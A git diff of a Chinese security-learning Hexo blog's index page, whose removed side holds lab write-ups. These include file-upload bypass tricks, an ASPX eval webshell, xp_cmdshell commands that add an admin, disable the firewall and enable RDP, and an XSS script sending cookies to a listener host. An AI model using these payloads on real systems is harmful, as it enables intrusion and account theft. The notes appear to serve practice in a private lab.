@@ -1,993 +1,279 @@
-
 <!DOCTYPE html>
-<html lang="en">
-    <head>
-        <meta charset="utf-8" />
-        <title>Hexo</title>
-        <meta name="author" content="John Doe" />
-        <meta name="description" content="" />
-        <meta name="keywords" content="" />
-        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
-        <link rel="icon" href="/images/favicon.png" />
-        <script src="https://cdn.staticfile.org/vue/3.3.4/vue.global.prod.min.js"></script>
-<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.4.0/css/all.min.css" />
-<link rel="stylesheet" href="/css/fonts.min.css" />
-<script> const mixins = {}; </script>
+<html>
+  <head>
+     
+    <meta charset="UTF-8">
+    <title>Hexo</title>
+    <link rel="shortcut icon" href="/static/img/icon.png">
+    <link rel="icon" href="/static/img/icon.png" sizes="192x192"/>
+    
+<link rel="stylesheet" href="/static/kico.css">
+<link rel="stylesheet" href="/static/hingle.css">
 
-<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <meta name="viewport" content="width=device-width, maximum-scale=1, initial-scale=1"/>
+    <meta property="og:site_name" content="Hexo">
+    <meta property="og:title" content=""/>
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+  <body>
+    <header>
+    <div class="head-title">
+        <h4>Hexo</h4>
+    </div>
+    <div class="head-action">
+        <div class="toggle-btn"></div>
+        <div class="light-btn"></div>
+        <div class="search-btn"></div>
+    </div>
+    <form class="head-search" method="post">
+        <input type="text" name="s" placeholder="搜索什么？">
+    </form>
+    <nav class="head-menu">
+        <a href="/">首页</a>
+        <div class="has-child">
+            <a>分类</a>
+            <div class="sub-menu">
+                
+            </div>
+        </div>
+        
+            <a href="/about">关于我</a>
+        
+            <a href="/friends">朋友们</a>
+        
+    </nav>
+</header>
+
+    <main>
+    <div class="wrap min">
+        <section class="home-title">
+            <h1>Hexo</h1>
+            <span></span>
+            
+    <div class="home-social">
+    
+        <a target="_blank" rel="noopener" href="https://github.com/Dreamer-Paul" title="Github">
+            <i class="fa fa-github"></i>
+        </a>
+    
+        <a target="_blank" rel="noopener" href="https://paul.ren" title="首页">
+            <i class="fa fa-home"></i>
+        </a>
+    
+    </div>
 
 
-<script src="https://cdn.staticfile.org/highlight.js/11.8.0/highlight.min.js"></script>
-<script src="https://cdn.staticfile.org/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
-<link
-    rel="stylesheet"
-    href="https://cdn.staticfile.org/highlight.js/11.8.0/styles/github.min.css"
-/>
-<script src="/js/lib/highlight.js"></script>
+        </section>
+        <section class="home-posts">
+    
+    <div class="post-item">
+        <h2>
+            <a href="/2023/11/08/test-my-site/">test_my_site</a>
+        </h2>
+    
+        <p></p>
+    
+        <div class="post-meta">
+            <time class="date">2023.11.08</time>
+            
+            
+        </div>
+    </div>
+    
+    <div class="post-item">
+        <h2>
+            <a href="/2023/09/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a>
+        </h2>
+    
+        <p>文件上传漏洞文件上传漏洞原理文件上传漏洞就是利用服务端代码对文件上传路径变量过滤不严格将可执行的文件上传到一个到服务器中 ，再通过URL去访问以执行恶意代码
+绕过方法1.在前端禁用js 可以使用...</p>
+    
+        <div class="post-meta">
+            <time class="date">2023.09.18</time>
+            
+            
+        </div>
+    </div>
+    
+    <div class="post-item">
+        <h2>
+            <a href="/2023/08/28/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/">靶场笔记</a>
+        </h2>
+    
+        <p> 给我一个网址让我去做渗透192.168.2.197以这个IP为例首先判断他是公网地址还是私网地址然后对他进行信息收集这里可以明显判断出来这是一个私网地址所以直接使用nmap进行端口扫描
 
+这里...</p>
+    
+        <div class="post-meta">
+            <time class="date">2023.08.28</time>
+            
+            
+        </div>
+    </div>
+    
+    <div class="post-item">
+        <h2>
+            <a href="/2023/08/10/xss/">xss</a>
+        </h2>
+    
+        <p>跨站脚本漏洞（xss）xss的基本概念
 
+xss漏洞一直被评估为web漏洞中危害较大的那种，在OWASP TOP10中一直处于前三的江湖地位
+xss漏洞是一种发生在前端的漏洞，所以他的危害对象主...</p>
+    
+        <div class="post-meta">
+            <time class="date">2023.08.10</time>
+            
+            
+                <span class="tags"><a class="-none-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></span>
+            
+        </div>
+    </div>
+    
+    <div class="post-item">
+        <h2>
+            <a href="/2023/08/08/sql%E6%B3%A8%E5%85%A5/">sql注入</a>
+        </h2>
+    
+        <p>数据库什么叫数据库
+数据库是以电子方式存储的系统数据集合。它可以包含任何类型的数据，包括文字、数字、图像、视频和文件。您可以使用称为数据库管理系统 (DBMS) 的软件来存储、检索和编辑数据。在...</p>
+    
+        <div class="post-meta">
+            <time class="date">2023.08.08</time>
+            
+            
+                <span class="tags"><a class="-none-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></span>
+            
+        </div>
+    </div>
+    
+    <div class="post-item">
+        <h2>
+            <a href="/2023/08/04/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a>
+        </h2>
+    
+        <p>信息收集1.首先先确认一个目标然后使用ICP备案网查询ICP&amp;#x2F;IP地址&amp;#x2F;域名信息备案管理系统 (miit.gov.cn)获取目标的域名
+2.然后使用企查查爱企查查询收集目标信...</p>
+    
+        <div class="post-meta">
+            <time class="date">2023.08.04</time>
+            
+            
+                <span class="tags"><a class="-none-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></span>
+            
+        </div>
+    </div>
+    
+    <div class="post-item">
+        <h2>
+            <a href="/2023/08/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/">计算机基础</a>
+        </h2>
+    
+        <p>1.HTTP响应码信息响应(100-199）成功响应（200-299）200：请求成功
+请求方式：主要的请求方式有两种一个叫“GET”一个叫“POST”
+比如说豆瓣的top250   https...</p>
+    
+        <div class="post-meta">
+            <time class="date">2023.08.04</time>
+            
+            
+        </div>
+    </div>
+    
+    <div class="post-item">
+        <h2>
+            <a href="/2023/07/29/%E9%9D%B6%E5%9C%BA%E7%9A%84%E6%90%AD%E5%BB%BA/">靶场的搭建</a>
+        </h2>
+    
+        <p>靶场的搭建1.首先准备搭建靶场的工具
+这里我会选择使用xampp这款软件来搭建服务器
+使用npp这个软件来查看和编辑代码
+最重要的是从github上下载一个靶场https://github.co...</p>
+    
+        <div class="post-meta">
+            <time class="date">2023.07.29</time>
+            
+            
+                <span class="tags"><a class="-none-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></span>
+            
+        </div>
+    </div>
+    
+    <div class="post-item">
+        <h2>
+            <a href="/2023/07/29/%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87cdn/">挖掘真实地址</a>
+        </h2>
+    
+        <p>绕过cdn为什么需要DNS把域名 解析为地址？网络通讯大部分是基于TCP&amp;#x2F;IP的，而TCP&amp;#x2F;IP是基于IP地址的，所以计算机在网络上进行通讯时只能识别如IP地址，而不能认识域...</p>
+    
+        <div class="post-meta">
+            <time class="date">2023.07.29</time>
+            
+            
+                <span class="tags"><a class="-none-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></span>
+            
+        </div>
+    </div>
+    
+    <div class="post-item">
+        <h2>
+            <a href="/2023/07/26/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/">我的hexo的部署</a>
+        </h2>
+    
+        <p>我的hexo的部署所要用到的环境和软件有(node.js)[https://nodejs.org/en] 和(GIt)[https://git-scm.com/downloads] 还需要一个g...</p>
+    
+        <div class="post-meta">
+            <time class="date">2023.07.26</time>
+            
+            
+        </div>
+    </div>
+    
+</section>
 
-<script src="/js/lib/preview.js"></script>
+        <section class="page-navigator">
+            <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">»</a>
+        </section>
+    </div>
+</main>
 
-
-
-
-
-<script src="/js/lib/home.js"></script>
-
-<link rel="stylesheet" href="/css/main.css" />
-
-    <meta name="generator" content="Hexo 7.0.0"></head>
-    <body>
-        <div id="layout">
-            <transition name="fade">
-                <div id="loading" v-show="loading">
-                    <div id="loading-circle">
-                        <h2>LOADING</h2>
-                        <p>加载过慢请开启缓存 浏览器默认开启</p>
-                        <img src="/images/loading.gif" />
-                    </div>
+    <footer>
+    <div class="buttons">
+        <a class="to-top" href="#"></a>
+    </div>
+    <div class="wrap min">
+        <section class="widget">
+            <div class="row">
+                <div class="col-m-4">
+                    <h3 class="title-recent">最新文章：</h3>
+                    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2023/11/08/test-my-site/">test_my_site</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/09/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/08/28/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/">靶场笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/08/10/xss/">xss</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/08/08/sql%E6%B3%A8%E5%85%A5/">sql注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/08/04/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></li></ul>
                 </div>
-            </transition>
-            <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
-    <nav id="desktop-menu">
-        <a class="title" href="/">
-            <span>HEXO</span>
-        </a>
-        
-        <a href="/">
-            <i class="fa-solid fa-house fa-fw"></i>
-            <span>&ensp;Home</span>
-        </a>
-        
-        <a href="/about">
-            <i class="fa-solid fa-id-card fa-fw"></i>
-            <span>&ensp;About</span>
-        </a>
-        
-        <a href="/archives">
-            <i class="fa-solid fa-box-archive fa-fw"></i>
-            <span>&ensp;Archives</span>
-        </a>
-        
-        <a href="/categories">
-            <i class="fa-solid fa-bookmark fa-fw"></i>
-            <span>&ensp;Categories</span>
-        </a>
-        
-        <a href="/tags">
-            <i class="fa-solid fa-tags fa-fw"></i>
-            <span>&ensp;Tags</span>
-        </a>
-        
-    </nav>
-    <nav id="mobile-menu">
-        <div class="title" @click="showMenuItems = !showMenuItems">
-            <i class="fa-solid fa-bars fa-fw"></i>
-            <span>&emsp;HEXO</span>
-        </div>
-        <transition name="slide">
-            <div class="items" v-show="showMenuItems">
-                
-                <a href="/">
-                    <div class="item">
-                        <div style="min-width: 20px; max-width: 50px; width: 10%">
-                            <i class="fa-solid fa-house fa-fw"></i>
-                        </div>
-                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
-                    </div>
-                </a>
-                
-                <a href="/about">
-                    <div class="item">
-                        <div style="min-width: 20px; max-width: 50px; width: 10%">
-                            <i class="fa-solid fa-id-card fa-fw"></i>
-                        </div>
-                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
-                    </div>
-                </a>
-                
-                <a href="/archives">
-                    <div class="item">
-                        <div style="min-width: 20px; max-width: 50px; width: 10%">
-                            <i class="fa-solid fa-box-archive fa-fw"></i>
-                        </div>
-                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
-                    </div>
-                </a>
-                
-                <a href="/categories">
-                    <div class="item">
-                        <div style="min-width: 20px; max-width: 50px; width: 10%">
-                            <i class="fa-solid fa-bookmark fa-fw"></i>
-                        </div>
-                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
-                    </div>
-                </a>
-                
-                <a href="/tags">
-                    <div class="item">
-                        <div style="min-width: 20px; max-width: 50px; width: 10%">
-                            <i class="fa-solid fa-tags fa-fw"></i>
-                        </div>
-                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
-                    </div>
-                </a>
-                
+                <div class="col-m-4">
+                    <h3 class="title-date">时光机：</h3>
+                    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
+                </div>
+                <div class="col-m-4">
+                    <h3 class="title-tags">标签云：</h3>
+                    <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 10px;">安全</a>
+                </div>
             </div>
-        </transition>
-    </nav>
-</div>
-<transition name="fade">
-    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
-</transition>
-
-            <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
-                <div id="home-head">
-    <div id="home-background" ref="homeBackground" data-images="/images/background.jpg"></div>
-    <div id="home-info" @click="homeClick">
-        <span class="loop"></span>
-        <span class="loop"></span>
-        <span class="loop"></span>
-        <span class="loop"></span>
-        <span class="info">
-            <div class="wrap">
-                <h1>Hexo</h1>
-                <h3></h3>
-                <h5></h5>
-            </div>
-        </span>
-    </div>
-</div>
-<div id="home-posts-wrap" true ref="homePostsWrap">
-    <div id="home-posts">
-        
-
-<div class="post">
-    <a href="/2023/11/08/test-my-site/">
-        <h2 class="post-title">test_my_site</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/11/8
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-    </div>
-    <a href="/2023/11/08/test-my-site/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2023/09/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
-        <h2 class="post-title">文件上传</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/9/18
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h3 id="文件上传漏洞原理"><a href="#文件上传漏洞原理" class="headerlink" title="文件上传漏洞原理"></a>文件上传漏洞原理</h3><p>文件上传漏洞就是利用服务端代码对文件上传路径变量过滤不严格将可执行的文件上传到一个到服务器中 ，再通过URL去访问以执行恶意代码</p>
-<h6 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h6><p>1.在前端禁用js 可以使用浏览器插件在页面上禁用掉js就能成功上传</p>
-<p>2.通过抓包修改数据包 抓包后更改Content-Type为允许的类型绕过该代码限制，比如将php文件的Content-Type:application&#x2F;octet-stream修改为image&#x2F;jpeg、image&#x2F;png、image&#x2F;gif 通过修改数据包以后就能成功上传</p>
-<p>3.大小写绕过比如说 .pHP  .aSP</p>
-<p>4.双写绕过 pphphp</p>
-<p>5.00截断  使用%00对文件名进行截断  1.php%00.jpg 当服务器检测到%00后就结束了</p>
-<p>6.修改.user.ini文件<img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230919003942360.png" alt="image-20230919003942360"></p>
-<p>7.修改.htaccess文件</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230919004035948.png" alt="image-20230919004035948"></p>
-<p>8.条件竞争通过burp抓包上传一个写马的马的文件同时访问和上传一直执行直到有burp有一条访问成功为止</p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-    </div>
-    <a href="/2023/09/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2023/08/28/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/">
-        <h2 class="post-title">靶场笔记</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/8/28
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p> 给我一个网址让我去做渗透192.168.2.197以这个IP为例<br>首先判断他是公网地址还是私网地址然后对他进行信息收集这里可以明显判断出来这是一个私网地址所以直接使用nmap进行端口扫描</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828122519457.png" alt="image-20230828122519457"></p>
-<p>这里可以看到扫到了两个端口一个是1433一个是27689</p>
-<p>1433是sql server的端口  27689是开放端口我们试图访问一下这个端口</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828122807495.png" alt="image-20230828122807495"></p>
-<p>可以发现他是一个登陆页面我们使用弱口令万能密码尝试发现进不去这个时候我们可以尝试使用kali里面的dir</p>
-<p>dirsearch或者御剑对他进行一个扫描对他的目录进行一个拼接<img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828130759008.png" alt="image-20230828130759008"></p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828135651156.png" alt="image-20230828135651156"></p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828123803932.png" alt="image-20230828123803932"></p>
-<p>拼接后的路径依次访问后可以发现拼上web.config.bak这个路径后可以发现自动下载了一个文件</p>
-<p>打开可以发现是一个数据的连接备份我们利用备份的账号和密码连接数据库（之前我们通过扫端口发现还有个1433的端口从而证明数据库类型是sql server）<img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828124614350.png" alt="image-20230828124614350"></p>
-<p>通过对数据库的一番查找发现了账户和密码经过多次尝试以后发现了正确的账号和密码</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828124842548.png" alt="image-20230828124842548"></p>
-<p>登陆成功以后发现来到了一个后台管理系统<img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828125022295.png" alt="image-20230828125022295"></p>
-<p>通过我们的一番查找我们找了可以进行文件上传的位置</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828130734041.png" alt="image-20230828130734041"></p>
-<p>这里通过查看他的网页后缀能看出来他是以aspx来搭建的我们先试试上传一个aspx文件试试</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828130951731.png" alt="image-20230828130951731"></p>
-<p>发现被拒接了我们尝试往前面翻看看他前面的文件是什么情况</p>
-<p>我们通过翻记录发现他最多识别32位我们可以利用这个点对文件进行上传</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828131144055.png" alt="image-20230828131144055"></p>
-<p>我写了一句话木马写入到一个txt文件并对他进行上传，上传的同时打开burp对网页进行抓包在抓到的包里面对文件进行修改通过查看上传的文件可以发现上传成功以后会自动给文件前面加上19个字符所以我们上传时要计算好字符位  </p>
-<blockquote>
-<p>木马： &lt;%@ Page Language&#x3D;”Jscript”%&gt;&lt;%eval(Request.Item[“123”],”unsafe”);%&gt;</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828132336357.png" alt="image-20230828132336357"></p>
-<p>抓包修改完成后放包</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828132419096.png" alt="image-20230828132419096"></p>
-<p>页面显示上传成功</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828132524075.png" alt="image-20230828132524075"></p>
-<p>可以看到刚刚上传的文件接下来就是拼接路径</p>
-<p>我们通过访问第一个文件可以看到系统存放的物理路径我们对这个物理路径进行一个拼接</p>
-<p>最后验证出正确的路径         \upfile\affix<img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828132824129.png" alt="image-20230828132824129"></p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828132950120.png" alt="image-20230828132950120"></p>
-<p>我能够成功访问</p>
-<p>这个时候打开中国蚁剑进行一个连接</p>
-<p>复制刚刚打开的网站路径复制进蚁剑</p>
-<p>然后输入密码</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828133220269.png" alt="image-20230828133220269"></p>
-<p>成功连接</p>
-<p>翻看主机的文件</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828133338906.png" alt="image-20230828133338906"></p>
-<p>又翻到一个数据库的备份文件</p>
-<p>尝试连接发现能够直接成功</p>
-<p>发现连接的第二个用户权限似乎更高直接在数据库里面进行写入</p>
-<p>修改管理员密码并且开启远程连接关闭防火墙</p>
-<p>USE master<br>RECONFIGURE<br>EXEC sp_configure ‘show advanced options’,1<br>RECONFIGURE<br>EXEC sp_configure ‘xp_cmdshell’,1<br>exec master..xp_cmdshell ‘net user admin 123 &#x2F;add’<br>exec master..xp_cmdshell ‘net localgroup administrators admin &#x2F;add’<br>exec master..xp_cmdshell ‘netsh firewall set opmode disable’<br>exec master..xp_cmdshell ‘REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f’<br>exec master..xp_cmdshell ‘netstat -anop tcp | find “3389”‘</p>
-<p>要是实在不行就使用</p>
-<p>USE master<br>RECONFIGURE<br>EXEC sp_configure ‘show advanced options’,1<br>RECONFIGURE<br>EXEC sp_configure ‘xp_cmdshell’,1<br>exec master..xp_cmdshell ‘net user Administrator   123’</p>
-<p>直接修改管理员密码</p>
-<p>修改完成后使用远程桌面连接</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828134047283.png" alt="image-20230828134047283"></p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828134406447.png" alt="image-20230828134406447"></p>
-<p>成功连接完成渗透</p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-    </div>
-    <a href="/2023/08/28/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2023/08/10/xss/">
-        <h2 class="post-title">xss</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/8/10
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="跨站脚本漏洞（xss）"><a href="#跨站脚本漏洞（xss）" class="headerlink" title="跨站脚本漏洞（xss）"></a>跨站脚本漏洞（xss）</h1><h3 id="xss的基本概念"><a href="#xss的基本概念" class="headerlink" title="xss的基本概念"></a>xss的基本概念</h3><blockquote>
-<ol>
-<li>xss漏洞一直被评估为web漏洞中危害较大的那种，在OWASP TOP10中一直处于前三的江湖地位</li>
-<li>xss漏洞是一种发生在前端的漏洞，所以他的危害对象主要也是前端用户。</li>
-<li>xss漏洞可以用来进行钓鱼攻击、前端js挖矿、用户cookie的获取。甚至可以结合浏览器自身的漏洞对用户主机进行远程控制等等。</li>
-</ol>
-</blockquote>
-<h3 id="xss的攻击流程"><a href="#xss的攻击流程" class="headerlink" title="xss的攻击流程"></a>xss的攻击流程</h3><p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230810233302223.png" alt="image-20230810233302223"></p>
-<h3 id="xss漏洞的常见类型"><a href="#xss漏洞的常见类型" class="headerlink" title="xss漏洞的常见类型"></a>xss漏洞的常见类型</h3><blockquote>
-<h5 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h5><h5 id="存储型（持久型xss）"><a href="#存储型（持久型xss）" class="headerlink" title="存储型（持久型xss）"></a>存储型（持久型xss）</h5><h5 id="dom型"><a href="#dom型" class="headerlink" title="dom型"></a>dom型</h5></blockquote>
-<h3 id="xss漏洞形成的原因"><a href="#xss漏洞形成的原因" class="headerlink" title="xss漏洞形成的原因"></a>xss漏洞形成的原因</h3><p>形成xss漏洞的主要原因是程序对输入和输出的控制不够严格，导致一些精心构造的脚本输入后，在输入到前端时被浏览器当作有效代码解析执行从而产生危害。</p>
-<h3 id="xss漏洞测试流程"><a href="#xss漏洞测试流程" class="headerlink" title="xss漏洞测试流程"></a>xss漏洞测试流程</h3><blockquote>
-<ol>
-<li>在目标站点上找到输入点，比如说查询接口留言板等等；</li>
-<li>输入一组“特殊字符+唯一识别字符”，点击提交后，查看返回的源码，是否有做对应的处理</li>
-<li>通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构造执行js的条件( 构造闭合 )</li>
-<li>提交构造的脚本代码(以及各种绕过姿势)，看是否可以成功执行，如果成功执行则说明存在XSS漏洞</li>
-</ol>
-</blockquote>
-<h3 id="xss攻击"><a href="#xss攻击" class="headerlink" title="xss攻击"></a>xss攻击</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; &lt;script&gt;alert(1)&lt;/script&gt;  测试xss漏洞</span><br><span class="line"></span><br><span class="line">&gt; &lt;script&gt;alert(document.cookie)&lt;/script&gt;   利用xss漏洞反弹cookie</span><br></pre></td></tr></table></figure>
-
-<p>存储型的可以通过xss和python联动获取到其他人的cookie从而伪造身份完成想要的目的</p>
-<p>首先先开启python的服务  python  -m http.server  1234</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20231007194433190.png" alt="image-20231007194433190"></p>
-<blockquote>
-<script> var img = document.createElement("img"); img.src="http://192.168.2.29:1234?"+escape(document.cookie); 
-</script>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20231007200221743.png" alt="image-20231007200221743"></p>
-<p>成功获取到登陆人的cookie</p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
-        </span>
-        
-    </div>
-    <a href="/2023/08/10/xss/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2023/08/08/sql%E6%B3%A8%E5%85%A5/">
-        <h2 class="post-title">sql注入</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/8/8
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><h3 id="什么叫数据库"><a href="#什么叫数据库" class="headerlink" title="什么叫数据库"></a>什么叫数据库</h3><blockquote>
-<p>数据库是以电子方式存储的系统数据集合。它可以包含任何类型的数据，包括文字、数字、图像、视频和文件。您可以使用称为数据库管理系统 (DBMS) 的软件来存储、检索和编辑数据。在计算机系统中，“数据库” 一词也可以指任何 DBMS、数据库系统或与数据库关联的应用程序。</p>
-</blockquote>
-<h3 id="数据库类型"><a href="#数据库类型" class="headerlink" title="数据库类型"></a>数据库类型</h3><blockquote>
-<h5 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h5><p>关系型数据库是一个结构化的数据库，创建在关系模型（二维表格模型）基础上，一般面<br>向于记录。<br>SQL 语句（标准数据查询语言）就是一种基于关系型数据库的语言，用于执行对关系型数<br>据库中数据的检索和操作。<br>主流的关系型数据库包括 Oracle、MySQL、SQL Server、Microsoft Access、DB2 等。</p>
-<h5 id="非关系型数据库"><a href="#非关系型数据库" class="headerlink" title="非关系型数据库"></a>非关系型数据库</h5><p>NoSQL(NoSQL &#x3D; Not Only SQL )，意思是“不仅仅是 SQL”，是非关系型数据库的总称。<br>除了主流的关系型数据库外的数据库，都认为是非关系型。<br>主流的 NoSQL 数据库有 Redis、MongBD、Hbase、CouhDB 等</p>
-</blockquote>
-<blockquote>
-<h5 id="常见数据库"><a href="#常见数据库" class="headerlink" title="常见数据库"></a>常见数据库</h5></blockquote>
-<p>一、关系型数据库</p>
-<blockquote>
-<ol>
-<li>MySql数据库 ，默认端口是: 3306；</li>
-<li>Oracle数据库 ，默认端口号为：1521；</li>
-<li>Sql Server数据库 ，默认端口号为：1433；</li>
-<li>DB2数据库， 默认端口号为：5000；</li>
-<li>PostgreSQL数据库， 默认端口号为：5432；</li>
-<li>国产的DM达梦数据库， 默认端口号为：5236。</li>
-</ol>
-</blockquote>
-<p>二、NoSql数据库（非关系型数据库）：</p>
-<blockquote>
-<ol>
-<li>Redis数据库，默认端口号：6379；</li>
-<li>Memcached数据库，默认端口号：11211 ；</li>
-<li>MongoDB数据库，默认端口号：27017</li>
-</ol>
-</blockquote>
-<h2 id="mysql常用命令"><a href="#mysql常用命令" class="headerlink" title="mysql常用命令"></a>mysql常用命令</h2><p>mysql -u root -p  #输入密码登陆root用户<br>show databases;  #查看数据库列表<br>use  school   #选择使用数据库school</p>
-<p>create database  school ;  #创建数据库school</p>
-<p>drop database school;    #删除数据库school</p>
-<blockquote>
-<p>create table student(   #创建表</p>
-</blockquote>
-<blockquote>
-<p>student_id int not null auto_increment, </p>
-</blockquote>
-<p>##创建列表student_id 数据类型为整形不能为空并设置为主键（auto_increment）下面也是同理</p>
-<blockquote>
-<p>name varchar(10) not null,   </p>
-</blockquote>
-<blockquote>
-<p>hender varchar(10) not null,</p>
